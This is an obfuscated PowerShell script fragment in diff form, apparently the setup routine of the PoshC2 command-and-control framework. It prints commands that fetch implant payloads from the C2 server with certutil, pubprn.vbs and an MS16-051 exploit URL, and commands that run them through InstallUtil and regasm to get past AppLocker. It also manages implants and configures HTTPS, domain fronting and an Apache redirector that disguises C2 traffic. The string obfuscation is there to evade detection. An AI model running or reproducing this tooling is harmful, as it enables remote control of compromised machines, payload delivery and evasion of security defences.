+    &("{0}{2}{1}" -f'write-ho','t','s') ""
+    &("{1}{0}{2}"-f 'rit','w','e-Host') ("{0}{3}{2}{10}{8}{9}{6}{5}{4}{1}{7}"-f 'To Bypass App','xe or','ocker','L','il.e','tallUt','s',' Regasm:','quivalent, us','e In',' or e')
+    &("{2}{0}{1}"-f'o','st','write-h') ((('C:hRLW'+'in'+'d'+'owsh'+'RLMi'+'croso'+'ft.NEThRLF'+'ramewo'+'rkhRLv4.0.30319hRLI'+'ns'+'ta'+'llUtil.ex'+'e ')-REPLacE'hRL',[chaR]92)+'/l'+'ogf'+'ile= '+'/LogTo'+'Cons'+'o'+'l'+'e=f'+'alse '+'/'+'U '+"$global:newdir\payloads\posh.exe") -ForegroundColor ("{0}{1}"-f 'gre','en')
+    &("{2}{0}{1}"-f'ri','te-host','w') (('C'+':{0}Windo'+'ws{0}Mic'+'ro'+'s'+'of'+'t.'+'N'+'ET{'+'0}Framewo'+'rk{0}v4.'+'0'+'.'+'30'+'319'+'{0}r'+'egasm.exe'+' ') -f  [Char]92+'/'+'U '+"$global:newdir\payloads\posh.exe") -ForegroundColor ("{0}{1}" -f'g','reen')
+    &("{1}{0}{2}"-f'te-hos','wri','t') ""
+    &("{1}{2}{0}" -f 'Host','wr','ite-') ("{10}{1}{2}{8}{12}{3}{7}{4}{5}{0}{6}{9}{11}"-f'u','o ','explo','1 vi','E9-','11 ','se th','a I','it MS16','e fol','T','lowing URL:','-05')
+    &("{2}{1}{0}{3}"-f 'e-ho','it','wr','st') "$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_ms16-051" -ForegroundColor ("{1}{0}"-f'n','gree')
+    &("{0}{1}{2}"-f 'wr','ite','-host') ""
+    &("{2}{0}{1}"-f'Hos','t','write-') ("{8}{15}{10}{14}{3}{13}{0}{12}{1}{17}{9}{11}{7}{5}{18}{6}{2}{16}{4}"-f ' I','l','ing U','ad ',':',' th',' follow','e','T','eral ','o','executable us','nstallUti','PoshC2','wnlo','o d','RL','/Gen','e')
+    &("{0}{1}{2}"-f 'writ','e-','host') "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_df`" " -ForegroundColor ("{0}{1}"-f'g','reen')
+    &("{2}{1}{0}" -f 'e-host','t','wri') ("certutil -urlcache -split -f $($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_iu %temp%\\$($downloaduri)_iu ") -ForegroundColor ("{1}{0}"-f'en','gre')
+    &("{0}{1}{2}{3}" -f'w','rit','e','-host') ""
+
+    
+    &("{0}{2}{1}"-f 'St','s','art-Proces') -FilePath ("{2}{3}{4}{0}{1}"-f '.','exe','p','o','wershell') -ArgumentList (' '+'-No'+'P '+'-Co'+'mman'+'d '+'im'+'p'+'ort-'+'mod'+'ule '+"$PoshPath\Implant-Handler.ps1; "+'I'+'mplan'+'t'+'-Han'+'dler '+'-'+'F'+'olderPa'+'th '+"'$global:newdir' "+'-'+'Pos'+'hPath '+"'$PoshPath'")
+
+    foreach (${T`ASk} in ${t`ASKsCOm`p`lE`TeD}) {
+    ${r`ESuLt`sdb} = &("{2}{0}{4}{3}{1}"-f 'q','eQuery','Invoke-S','t','li') -DataSource ${d`A`TAba`sE} -Query ('SE'+'LEC'+'T '+'* '+'FROM'+' '+'Co'+'mplet'+'ed'+'Tasks '+'WHER'+'E '+"CompletedTaskID=$task") -as ("{0}{1}{2}" -f'PSO','bj','ect')
+    ${ranu`Ri} = ${ReS`UL`Tsdb}."rAn`DOmu`Ri"
+    ${ImpLaNT`RE`sU`Lts} = &("{0}{1}{2}{3}{5}{4}" -f 'I','n','voke-','SqliteQ','y','uer') -DataSource ${dAT`Ab`A`Se} -Query ('SE'+'LECT'+' '+'* '+'FRO'+'M '+'Im'+'pl'+'ants'+' '+'WH'+'ERE '+"RandomURI='$ranuri'") -as ("{0}{1}"-f'PSObjec','t')
+    ${I`mpLA`N`THOST} = ${Im`PLaNTrEs`UL`TS}."U`SER"
+    ${imP`h`oST} = ${I`MPl`AnTRES`ULtS}."hOst`N`AMe"
+    ${i`Mp`iD} = ${iMpl`An`T`ReSuLTS}."impl`AnTiD"
+    ${iMPd`OM} = ${i`MPlan`TrEs`U`lts}."Do`M`Ain"
+
+    if (${R`Es`UL`TsdB})
+    {
+        if (${rEsUl`Ts`DB}."co`mM`AnD".("{1}{2}{0}" -f'r','tol','owe').Invoke().("{2}{3}{1}{0}"-f'h','wit','star','ts').Invoke(("{2}{1}{3}{0}"-f 't','-scr','get','eensho'))) {}
+        if (${reSu`LT`sDB}."CoM`MANd".("{0}{1}{2}"-f 't','olowe','r').Invoke().("{2}{0}{1}"-f'arts','with','st').Invoke((('UDhs'+'h'+'ellc'+'ode')."repL`AcE"('UDh',[stRiNG][ChAR]36)))) {}
+        elseif  (${r`EsulT`SDb}."co`MMa`ND".("{0}{1}" -f 'tol','ower').Invoke().("{2}{3}{1}{0}"-f 'ith','sw','star','t').Invoke(("{1}{2}{0}"-f'ile','download','-f'))) {}
+        else 
+        {
+            ${Tas`KtIMe} = ${RE`SULTs`Db}."tAsK`ID"
+            &("{1}{0}{2}"-f'rit','W','e-Host') ('Comman'+'d'+' '+'iss'+'ued '+'aga'+'inst '+'i'+'mplant '+"$impID "+'o'+'n '+'hos'+'t '+"$impHost "+"$impDom "+"($TaskTime)") -ForegroundColor ("{0}{1}" -f 'Yel','low')
+            &("{1}{2}{0}" -f 'e-Host','W','rit') -Object ${r`ESULt`SDb}."COm`MA`Nd" -ForegroundColor ("{0}{1}"-f 'Gree','n')
+            &("{2}{1}{3}{0}" -f'ost','r','W','ite-H') -Object ${rEsu`L`TsdB}."o`UTpUT" -ForegroundColor ("{1}{0}"-f 'een','Gr')
+        }
+        ${Tas`Kid`db} ++
+    }
+    }
+    ${n`eWcOU`Nt} = ${tAskSC`oM`PL`etEd}."cOu`Nt"
+    ${tAsKi`d`db} = ${n`EWC`OUNT}+1
+    &("{1}{0}{2}"-f 'e-ho','writ','st') ("$newcount "+'t'+'ask'+'s '+'c'+'omp'+'leted '+'b'+'efore '+'re'+'sum'+'ing '+'the'+' '+'C'+'2 '+'s'+'erver')
+}
+else 
+{
+    
+    ${Lo`cA`liPFuLL} = &("{0}{2}{1}" -f 'G','ject','et-WmiOb') -Query ('se'+'lect'+' '+'* '+'f'+'rom '+'W'+'in3'+'2_N'+'etworkAdap'+'terConfigur'+'ati'+'on '+'whe'+'re '+'I'+'PEn'+'ab'+'led '+'= '+"$true") |
+    &("{2}{3}{0}{1}"-f 'O','bject','Se','lect-') -ExpandProperty ("{1}{0}{2}"-f 'd','IPA','dress') | 
+    &("{1}{3}{2}{0}"-f 't','Wh','Objec','ere-') -FilterScript {([Net.IPAddress]${_})."aDD`RE`ssfa`MIlY" -eq ("{3}{1}{2}{0}"-f'work','nter','Net','I')}
+    if (${LOC`ALIp`F`ULl})
+    {
+        &("{3}{0}{2}{1}"-f'O','tput','u','Write-') -InputObject ('IP'+' '+'f'+'ound: '+"$localipfull")
+        &("{0}{3}{2}{1}"-f'wr','host','-','ite') ""
+        ${pRo`mPT} = &("{1}{2}{0}" -f'-Host','R','ead') -Prompt "[1] Enter the IP address or Hostname of the Posh C2 server (External address if using NAT) [$($localipfull)] "
+        ${iPV4`ADDR`Ess} = (${L`O`CalipF`ULL},${Pro`m`Pt})[[bool]${PRoM`Pt}]
+    }
+    ${u`RI}=("{1}{0}{2}"-f'p:/','htt','/')
+    ${PrOM`pTh`T`T`PSdEF} = "Yes"
+    ${pro`MPt`H`TTPS} = &("{2}{0}{1}"-f'-H','ost','Read') -Prompt ("{9}{1}{0}{4}{7}{6}{10}{11}{3}{2}{8}{5}" -f' ',' you','lant',' imp','want','es]','us',' to ',' comms? [Y','[2] Do','e HT','TPS for')
+    ${PROm`pT`HTT`Ps} = (${P`ROmp`TH`TtPSdeF},${PrO`MpT`htTpS})[[bool]${PRompt`Ht`T`Ps}]
+    if (${PR`oMPt`HTtPs} -eq "Yes") {
+    ${u`RI}=("{2}{0}{1}"-f 'ttps','://','h')
+    ${IPv4a`dDR`e`Ss} = ("{0}{2}{1}"-f'ht','ps://','t')+${iPV4`ADD`R`eSs}
+    ${PrOmpT`s`sldefA`ULT} = "Yes"
+
+    
+    ${PS`V`Er} = ${pSv`erSioN`T`ABLE}."psVe`R`sIOn"."Ma`JOr"
+    if (${P`sVer} -lt '4') {
+        ${pR`OmP`TssL} = &("{0}{1}{2}"-f'Read-H','o','st') -Prompt ("{12}{9}{5}{0}{10}{16}{14}{3}{23}{15}{13}{4}{6}{19}{18}{11}{22}{20}{17}{2}{8}{1}{21}{7}"-f ' ','cates [','lf-si',' want Pos',' de','a]','f',']','gned SSL certifi','2','D',' and','[','se','u','C2 to u','o yo','e','ult','a','s','Yes',' permit ','h')
+        ${PR`Ompts`SL} = (${pROM`pTssld`e`FaU`Lt},${Pr`om`pTSsL})[[bool]${p`R`Omp`TSsL}]
+        if (${pRo`mPts`sL} -eq "Yes") {
+            ${IN`s`E`CUre} = "YES"
+            &("{1}{2}{0}"-f 'IL','CERT','UT') -f -p ("{0}{2}{1}"-f'p','c2','osh') -importpfx "$PoshPath\poshc2.pfx" 
+            ${ThU`mb} = ("{6}{9}{3}{0}{11}{10}{7}{8}{4}{2}{5}{1}" -f'3F8E0ED','747','6','9','2CE9','991','DE5','53F3','EB51','ADA2256','4','43')
+            ${dEL`ET`eD} = &("{2}{1}{0}"-f 'e','h.ex','nets') ("{0}{1}"-f 'ht','tp') ("{1}{0}"-f 'elete','d') ("{0}{1}" -f 'ss','lcert') ("{1}{0}{3}{2}"-f 't','ippor','.0:443','=0.0.0')
+            ${ad`deD} = &("{2}{0}{1}" -f'tsh.ex','e','ne') ("{0}{1}" -f 'h','ttp') ("{1}{0}"-f'dd','a') ("{0}{1}"-f'sslce','rt') ("{3}{0}{2}{4}{1}" -f 'o','3','r','ipp','t=0.0.0.0:44') ((("{0}{2}{1}{3}"-f 'cert','Tthu','hash=Sf','mb'))-CREPLacE ([CHAR]83+[CHAR]102+[CHAR]84),[CHAR]36) "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
+            if (${a`dDED} = ("{0}{5}{2}{1}{4}{3}{6}" -f 'SSL Certificat','y','full','dde',' a','e success','d')) {
+                ${Ce`RT} = &("{1}{0}{2}" -f 'ex','netsh.','e') ("{0}{1}"-f 'htt','p') ("{1}{0}"-f'w','sho') ("{2}{1}{0}" -f 't','cer','ssl') ("{2}{0}{1}{3}" -f '0','.0:4','ipport=0.0.','43')
+            }
+        } else {
+            ${iNseC`U`RE} = "No"
+            &("{2}{3}{0}{1}" -f'e-Er','ror','Wri','t') ("{5}{3}{6}{2}{1}{4}{0}" -f'cate','if','he cert','ing','i','Error add',' t') 
+            &("{0}{3}{1}{2}"-f 'Wr','t','e-Host','i') "`nEither install a self-signed cert using IIS Resource Kit as below
+https://www.microsoft.com/en-us/download/details.aspx?id=17275
+selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443
+
+or 
+    
+Download and convert the PEM to PFX for windows import and import to personal:
+openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx
+
+Grab the thumbprint:
+dir cert:\localmachine\my|% { `$_.thumbprint}
+
+Install using netsh:
+netsh http delete sslcert ipport=0.0.0.0:443
+netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
+"
+}
+    } else {
+    ${P`ROMPtS`SL} = &("{0}{1}{2}"-f'Re','ad-','Host') -Prompt ("{7}{1}{9}{2}{17}{11}{3}{8}{5}{4}{12}{18}{15}{14}{16}{0}{13}{10}{6}" -f 'cat','Do you ','t ','o',' a','default',']','[2a] ',' use ','wan','es','oshC2 t','nd permit','es [Y','d SSL ','lf-signe','certifi','P',' se')
+    ${PR`O`MpTSsL} = (${pro`M`PT`S`SLDE`FaulT},${pr`OMpT`sSL})[[bool]${PR`oMPTs`sl}]
+    if (${p`R`omPtSsl} -eq "Yes") {
+        ${IN`S`EcuRe} = "YES"
+        ${THU`mB} = &("{0}{1}{3}{4}{2}" -f 'Ne','w-Se','tificate','l','fSignedCer') -certstorelocation ((("{3}{5}{0}{1}{2}{6}{4}" -f'e','loca','l','cert:o','emy','4','machineo4'))-CREpLaCe'o4e',[CHaR]92) -dnsname ${IpV4`A`DDr`eSs} | &("{0}{1}" -f'sel','ect') ("{2}{1}{0}" -f 'nt','ri','thumbp') -ExpandProperty ("{0}{3}{2}{1}"-f't','int','umbpr','h')
+        ${D`e`LeTEd} = &("{0}{1}{2}"-f 'n','e','tsh.exe') ("{1}{0}"-f 'ttp','h') ("{1}{0}" -f 'ete','del') ("{2}{0}{1}"-f 'lc','ert','ss') ("{1}{2}{0}{3}"-f '=0.0.0','ip','port','.0:443')
+        ${A`DDEd} = &("{1}{0}{2}"-f 'sh.','net','exe') ("{1}{0}" -f'ttp','h') ("{0}{1}"-f'a','dd') ("{0}{1}"-f'sslc','ert') ("{4}{1}{0}{3}{2}" -f '.','port=0','.0.0:443','0','ip') ((("{5}{4}{2}{0}{1}{3}" -f't','hum','ash={0}','b','erth','c')) -f [CHaR]36) "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
+        if (${ADd`eD} = ("{1}{6}{5}{4}{3}{2}{0}" -f 'dded','SSL','cessfully a',' suc','ificate','ert',' C')) {
+            ${CE`RT} = &("{2}{1}{0}"-f'sh.exe','et','n') ("{1}{0}" -f 'tp','ht') ("{1}{0}"-f 'ow','sh') ("{0}{1}" -f'sslcer','t') ("{2}{3}{1}{0}" -f'0.0:443','0.0.','ipport','=')
+        } else {
+            &("{0}{2}{1}"-f'Write-Err','r','o') ("{2}{1}{3}{4}{0}" -f'g the certificate','rror ','E','ad','din') 
+            &("{0}{2}{1}" -f'W','t','rite-Hos') "`nEither install a self-signed cert using IIS Resource Kit as below
+https://www.microsoft.com/en-us/download/details.aspx?id=17275
+selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443
+
+or 
+    
+Download and convert the PEM to PFX for windows import and import to personal:
+openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx
+
+Grab the thumbprint:
+dir cert:\localmachine\my|% { `$_.thumbprint}
+
+Install using netsh:
+netsh http delete sslcert ipport=0.0.0.0:443
+netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
+"
+}
+} else {
+                ${I`NseCuRE} = "NO"
+            &("{0}{1}{2}{3}" -f'Write','-H','o','st') "`nEither install a self-signed cert using IIS Resource Kit as below
+https://www.microsoft.com/en-us/download/details.aspx?id=17275
+selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443
+
+or 
+    
+Download and convert the PEM to PFX for windows import and import to personal:
+openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx
+
+Grab the thumbprint:
+dir cert:\localmachine\my|% { `$_.thumbprint}
+
+Install using netsh:
+netsh http delete sslcert ipport=0.0.0.0:443
+netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
+"
+}
+
+}
+
+    ${prOm`ptD`o`mFRONt`dEF} = "No"
+    ${p`ROMpTD`OmFRoNT} = &("{0}{1}{2}" -f 'Read','-Ho','st') -Prompt ("{4}{7}{1}{2}{9}{6}{0}{10}{3}{8}{5}"-f'use ','] Do y','ou w','ing','[',' [No]','o ','2b','?','ant t','domain front')
+    ${PR`omptDo`mf`RO`NT} = (${prOMPtdo`MFR`o`N`TDEf},${p`ROmPt`DO`MfR`oNt})[[bool]${PrOmPtDo`MFr`OnT}]
+    if (${PROM`ptDO`MfrO`NT} -eq "Yes") {
+        ${proM`PtdOmfRO`Nt} = &("{1}{0}{2}"-f'd-Hos','Rea','t') -Prompt ("{0}{1}{5}{4}{2}{6}{9}{7}{3}{12}{8}{11}{10}"-f'[2c','] Please spec','he hos','r ',' t','ify','t h','r fo','mai','eade','ronting?','n f','do')
+        if (${P`RoMptDOM`FrO`Nt}) {
+            ${dO`mAInFRoNt`HEA`dEr} = ${pR`Om`PTdOM`FrOnt}
+        }
+    }
+
+    ${DefA`U`L`TS`eRVeRPo`Rt} = 443
+    } else {
+    ${IpV`4adDre`Ss} = ("{1}{2}{0}" -f 'p://','h','tt')+${iP`V4`A`ddREss}
+        ${defAuLtSERV`E`RPO`RT} = 80
+    }
+    
+    ${A`Pa`chE} = ((("{22}{9}{32}{36}{2}{31}{15}{33}{16}{25}{26}{11}{6}{23}{29}{21}{27}{19}{1}{12}{30}{0}{14}{5}{34}{20}{7}{24}{10}{18}{4}{17}{13}{35}{37}{8}{3}{28}" -f'erExpire off
+
+D','Name off
+SSLProx','Proxy','Z','r','shC2 <ADD','Verify ','_HERE>','>
+
+4','Rewrite','efin','oxy','yCheck','PAD','efine Po','gine On','ee','pSocks <ADD_I','e Sha','r','DDRESS','ne
+SSLProxyCheckPe','4ZH
+','n','
+D','rCN Off
+SSL','Pr','e','H','o','Pe','En','Engine On
+','
+SSLProxyCheckP','_IPA','DRESS','SSL','_HERE'))."rE`Pl`ACe"(([ChaR]52+[ChaR]90+[ChaR]72),[StrING][ChaR]34))
+    ${Cus`ToM`U`RldEf} = "No"
+    ${C`USTOM`URL} = &("{1}{2}{0}" -f'st','Re','ad-Ho') -Prompt ("{2}{14}{6}{1}{10}{13}{11}{8}{12}{7}{0}{5}{4}{3}{9}{15}" -f'ze the be','you w','[','RL','n U','aco','a] Do ','i','ust','s from the default? ','an','to c','om','t ','3','[No]')
+    ${cU`st`o`muRl} = (${Cus`ToMurl`DeF},${cu`S`TOmurl})[[bool]${C`U`S`TOMuRL}]
+    if (${Cust`OMu`RL} -eq "Yes") {
+        ${u`RLs} = @()
+        do {
+            ${in`P`UT} = (&("{1}{2}{0}" -f 't','R','ead-Hos') ("{2}{1}{14}{0}{15}{12}{3}{17}{4}{19}{9}{11}{18}{16}{13}{6}{5}{8}{20}{10}{7}" -f 'the ','ease ','Pl','nt to us','t','ma',' i','ontent','ges','ank entry to','te/c',' ','a','h:','enter ','URLs you w','inis','e, en','f','er bl','/si'))
+            if (${Inp`UT} -ne '') {${UR`lS} += "`"$input`""; ${Ap`AcHE} += "`nRewriteRule ^/$input(.*) $uri`${PoshC2}/$input`$1 [NC,L,P]"}
+        }
+        until (${iN`p`Ut} -eq '')
+        [string]${ur`l`S`TRing} = ${n`Ull}
+        ${Ur`Ls`TRinG} = ${uR`lS} -join ","
+    } else {
+        ${ur`lsTRi`Ng} = ((("{54}{41}{3}{74}{75}{76}{122}{0}{13}{6}{36}{98}{17}{86}{7}{1}{18}{100}{25}{51}{62}{12}{39}{4}{97}{123}{105}{2}{87}{91}{60}{110}{95}{65}{55}{102}{43}{58}{111}{121}{69}{94}{109}{72}{32}{57}{85}{19}{99}{80}{15}{8}{48}{113}{79}{112}{59}{22}{29}{82}{42}{46}{9}{78}{21}{90}{28}{96}{24}{44}{93}{49}{20}{53}{83}{117}{118}{61}{27}{114}{77}{35}{33}{31}{52}{66}{10}{26}{84}{106}{50}{92}{101}{107}{73}{38}{5}{23}{89}{45}{47}{16}{104}{34}{119}{37}{67}{124}{14}{70}{56}{30}{115}{71}{116}{40}{68}{64}{88}{120}{81}{108}{103}{11}{63}"-f'0},{0}n','ts/','0}','ati','m/conne','ges/{0},{','ba','prin','eneral/','pac',',{','nlimited/','0','ews/{0},{0}we','fr','}g','0},{','atic/{0},{','{0}','view','sc','igger/may/{0},','{0},{0','0}plu','pr','0','0','r/{0}','/mast','}organ','o','l/app/a','r/templates/{0},{0}f','g/v/awe/poo','as/saf','ppin','pp','gi','en/uk/pa','},{0}stea','nt/{0},{','mages/st','atio','s/','em','mai','ns/s','ns/custom/uk/{','commun','u','n/','}wordpre','/{','/','{0}i',',{0}p','co','orums/r','s','ga/','ing','/maste','ss/site/{','{0}','e','}','0}','ster/{0},{0}online','0}fr','},{0}ok','ee/advice/{0},{0}','ies/web','b/maste','/','c/c','onten','t/','ho','e/value/{0},{0}tr','y','0},{0','p','is','builder','}','e','0}images/','ho','e/uk','gins/do','{0}web','ld','pages/','ium/gov/pop/{0},{0}','fn/webs','ce/images/{0','er/review/{0},{0}','c','/st','/{',',{','{0},{0}sto','reference','u','0}g','mages/static/{0},{','pl/e','re','ing/','ite/blo','s/offi','it','/me','it',',{0}s','k','sites/conte','/powe','r','e/re','/shop','e/{0','{','t/{0},{0}true/i','/')) -f  [chaR]34)
+            ${A`Pa`cHe} = @"
+RewriteEngine On
+SSLProxyEngine On
+SSLProxyCheckPeerCN Off
+SSLProxyVerify none
+SSLProxyCheckPeerName off
+SSLProxyCheckPeerExpire off
+
+Define PoshC2 <ADD_IPADDRESS_HERE>
+Define SharpSocks <ADD_IPADDRESS_HERE>
+
+RewriteRule ^/images/static/content/(.*) $uri`${PoshC2}/images/static/content/`$1 [NC,L,P]
+RewriteRule ^/news/(.*) $uri`${PoshC2}/news/`$1 [NC,L,P]
+RewriteRule ^/webapp/static/(.*) $uri`${PoshC2}/webapp/static/`$1 [NC,L,P]
+RewriteRule ^/images/prints/(.*) $uri`${PoshC2}/images/prints/`$1 [NC,L,P]
+RewriteRule ^/wordpress/site/(.*) $uri`${PoshC2}/wordpress/site/`$1 [NC,L,P]
+RewriteRule ^/true/images/(.*) $uri`${PoshC2}/true/images/`$1 [NC,L,P]
+RewriteRule ^/holdings/office/images/(.*) $uri`${PoshC2}/holdings/office/images/`$1 [NC,L,P]
+RewriteRule ^/steam/connect/(.*) $uri`${PoshC2}/steam/connect/`$1 [NC,L,P]
+RewriteRule ^/preferences/site/(.*) $uri`${PoshC2}/preferences/site/`$1 [NC,L,P]
+RewriteRule ^/okfn/website/blob/master/templates/(.*) $uri`${PoshC2}/okfn/website/blob/master/templates/`$1 [NC,L,P]
+RewriteRule ^/forums/review/(.*) $uri`${PoshC2}/forums/review/`$1 [NC,L,P]
+RewriteRule ^/general/community/mega/(.*) $uri`${PoshC2}/general/community/mega/`$1 [NC,L,P]
+RewriteRule ^/organisations/space/value/(.*) $uri`${PoshC2}/organisations/space/value/`$1 [NC,L,P]
+RewriteRule ^/trigger/may/(.*) $uri`${PoshC2}/trigger/may/`$1 [NC,L,P]
+RewriteRule ^/web/master/review/(.*) $uri`${PoshC2}/web/master/review/`$1 [NC,L,P]
+RewriteRule ^/premium/gov/pop/(.*) $uri`${PoshC2}/premium/gov/pop/`$1 [NC,L,P]
+RewriteRule ^/usc/builder/power/master/(.*) $uri`${PoshC2}/usc/builder/power/master/`$1 [NC,L,P]
+RewriteRule ^/shopping/v/awe/pool/app/a/(.*) $uri`${PoshC2}/shopping/v/awe/pool/app/a/`$1 [NC,L,P]
+RewriteRule ^/pl/en/pages/(.*) $uri`${PoshC2}/pl/en/pages/`$1 [NC,L,P]
+RewriteRule ^/store/en/uk/pages/(.*) $uri`${PoshC2}/store/en/uk/pages/`$1 [NC,L,P]
+RewriteRule ^/plugins/domains/custom/uk/(.*) $uri`${PoshC2}/plugins/domains/custom/uk/`$1 [NC,L,P]
+RewriteRule ^/gas/safe/register/(.*) $uri`${PoshC2}/gas/safe/register/`$1 [NC,L,P]
+RewriteRule ^/online/free/advice/(.*) $uri`${PoshC2}/online/free/advice/`$1 [NC,L,P]
+RewriteRule ^/cookies/websites/content/(.*) $uri`${PoshC2}/cookies/websites/content/`$1 [NC,L,P]
+RewriteRule ^/free/uk/shopping/unlimited/(.*) $uri`${PoshC2}/free/uk/shopping/unlimited/`$1 [NC,L,P]
+"@
+    }
+
+    ${cu`STO`MUrL`dEF} = "No"
+    ${C`UStoMu`Rl} = &("{1}{0}{2}"-f 'H','Read-','ost') -Prompt ("{13}{3}{4}{8}{1}{11}{6}{10}{15}{12}{9}{7}{14}{2}{0}{5}"-f 'pS','e th','roxy (Shar','] Do you want to cu','st','ocks)? [No]','con U','o','omiz',' the S','RL','e bea','m','[3b','cks P','s fro')
+    ${CUstoM`U`RL} = (${cUSTO`MurL`DEf},${CusT`OM`URL})[[bool]${cuST`OM`U`Rl}]
+    if (${Cu`STOM`UrL} -eq "Yes") {
+        ${uR`ls} = @()
+        do {
+            ${i`NP`Ut} = (&("{2}{0}{1}" -f 'ad','-Host','Re') ("{0}{1}{14}{5}{3}{8}{7}{10}{6}{13}{12}{4}{2}{11}{9}" -f'Pleas','e ent','/site/con','ant to use,','s',' w','t','nk ',' enter bla','ent','entry ','t',' image','o finish:','er the URLs you'))
+            if (${INp`UT} -ne '') {${U`RLs} += "`"$input`""; ${APa`c`hE} += "`nRewriteRule ^/$input(.*) $uri`${SharpSocks}/$input`$1 [NC,P]"}
+        }
+        until (${In`p`Ut} -eq '')
+        [string]${SocksuRL`S`T`RiNg} = ${N`UlL}
+        ${SOc`K`surlst`RiNG} = ${u`Rls} -join ","
+    } else {
+        ${So`c`kS`URlSt`RInG} = ((("{3}{24}{1}{28}{8}{10}{25}{7}{17}{19}{6}{9}{26}{29}{11}{4}{0}{27}{5}{13}{23}{20}{2}{15}{16}{12}{14}{22}{21}{18}"-f 'p','tem','u0H,u0Hsa','u0H','0Hu','at','u0H,u0Hp','visitors','/pushu0','rint','H,',',u','/update','e','/','ml/sta','ts','/uploa','0H','d/map','st/traffic','hu','pus','/late','si','u0H','ing/images/bin/log','d','ap/api','ou0H')) -cREPlAcE 'u0H',[ChAr]34)
+        ${Apa`ChE} += @"
+
+RewriteRule ^/sitemap/api/push(.*) $uri`${SharpSocks}/sitemap/api/push`$1 [NC,L,P]
+RewriteRule ^/visitors/upload/map(.*) $uri`${SharpSocks}/visitors/upload/map`$1 [NC,L,P]
+RewriteRule ^/printing/images/bin/logo(.*) $uri`${SharpSocks}/printing/images/bin/logo`$1 [NC,L,P]
+RewriteRule ^/update/latest/traffic(.*) $uri`${SharpSocks}/update/latest/traffic`$1 [NC,L,P]
+RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/push`$1 [NC,L,P]
+"@
+    }
+
+    ${CUS`TOm`Usera`GeNtDeF} = "No"
+    ${C`Us`T`oMus`ERAGENT} = &("{0}{1}{2}"-f'Read-H','o','st') -Prompt ("{7}{10}{11}{6}{9}{0}{5}{1}{2}{4}{8}{3}" -f 'e','ul','t UserA','o]','gen',' defa',' want to cu','[4a','t? [N','stomize th','] Do yo','u')
+    ${CuSTom`USeR`A`gEnT} = (${C`USTo`MusERAgENT`DeF},${cUSToMUs`ERa`GE`Nt})[[bool]${cUs`TOMUSE`Ra`GE`Nt}]
+
+    if (${C`Usto`MUS`era`GEnT} -eq "Yes") {
+        ${use`R`Age`NT} = (&("{0}{2}{1}" -f'Re','Host','ad-') ("{3}{2}{4}{1}{0}{5}{6}{7}"-f 'Ag','r','r ','Please ente','the Use','ent you want to us','e:',' '))
+    } else {
+        ${us`ErAG`EnT} = ("{7}{6}{13}{2}{11}{10}{18}{8}{9}{14}{5}{1}{4}{12}{21}{16}{19}{17}{15}{3}{20}{0}"-f'ike Gecko','d','i','v:','en','.3; WOW64; Tri','ozilla/5.0 ','M',' ','NT','o','nd','t','(W',' 6','ch; r',' ','ou','ws','T','11.0) l','/7.0;')
+    }
+
+    ${cu`STOmr`eFeRer} = "No"
+    ${CUStOMU`SERA`Ge`Nt} = &("{1}{0}{2}"-f 'ad-','Re','Host') -Prompt ("{9}{4}{3}{0}{7}{8}{6}{2}{10}{1}{5}" -f 'Do you ','er?','erer',' ','b]',' [No]','to a ref','wa','nt ','[4',' head')
+    ${cu`sTO`MUSErA`GEnt} = (${cu`sTomusEr`AgEn`TDEF},${cu`StoMU`S`ER`AGe`NT})[[bool]${C`UStOM`U`serAGEnt}]
+
+    if (${C`USTOMus`ERa`gENT} -eq "Yes") {
+        ${rEF`ER`ER} = (&("{2}{1}{0}" -f'st','o','Read-H') ("{2}{6}{0}{1}{5}{4}{3}"-f'the',' Referer y','Please ','use: ',' want to ','ou','enter '))
+    } else {
+        ${R`EfEreR} = ""
+    }
+
+    ${Glob`Al:n`eW`D`iR} = ("{1}{0}" -f'shC2-','Po')+(&("{2}{0}{1}" -f '-da','te','get') -Format ("{0}{3}{1}{4}{2}"-f 'y','dd','Hmm','yy-MM-','-H'))
+    ${pRo`M`pT} = &("{0}{1}{2}" -f 'R','e','ad-Host') -Prompt "[5] Enter a new folder name for this project [$($global:newdir)] "
+    ${TEMp`D`Ir}= (${g`LO`BA`L:`NewdIR},${p`ROm`PT})[[bool]${p`ROM`Pt}]
+    ${Roo`TF`OLD`ER} = ${p`oSh`pAtH}.("{0}{2}{1}"-f'Tr','d','imEn').Invoke(((("{1}{0}{2}"-f'wershellC2G','Po','Yn')).("{2}{1}{0}" -f'CE','A','REpL').Invoke('GYn','\')))
+    ${GL`oBaL:`NeW`dIr} = ${r`OoTFOld`eR}+"\"+${t`emPD`IR}
+
+    ${DeFB`ea`CO`NTimE} = "5s"
+    ${pr`o`mPt} = &("{0}{1}" -f'Read-H','ost') -Prompt "[6] Enter the default beacon time of the Posh C2 Server - 30s, 5m, 1h (10% jitter is always applied) [$($defbeacontime)] "
+    ${DefAULt`B`ea`con} = (${d`ef`B`EaCONTi`me},${p`RO`Mpt})[[bool]${PrOm`pt}]
+    if (${dEfA`U`L`TBE`ACoN}.("{0}{2}{1}"-f'ToL','wer','o').Invoke().("{0}{1}{2}" -f 'Contai','n','s').Invoke('m')) { 
+        ${dE`Fa`UL`TbEAcOn} = ${dEfa`UL`T`BeAcON} -replace 'm', ''
+        [int]${ne`WsLeEP} = ${dE`F`AuLT`BEA`CoN} 
